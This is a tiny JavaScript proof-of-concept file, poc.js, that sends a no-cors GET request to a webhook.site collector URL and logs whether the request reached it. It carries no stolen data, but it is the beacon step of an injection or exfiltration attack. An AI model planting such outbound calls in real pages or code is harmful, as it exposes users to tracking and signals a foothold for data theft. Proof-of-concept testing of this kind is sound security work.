// poc.js
(() => {
  const url = "https://webhook.site/c3444402-12db-4d8a-a694-0bc71f2c1521";

  fetch(url, { method: "GET", mode: "no-cors" })
    .then(() => console.log("[POC] Webhook hit ✅"))
    .catch(err => console.error("[POC] Fetch failed ❌", err));
})();
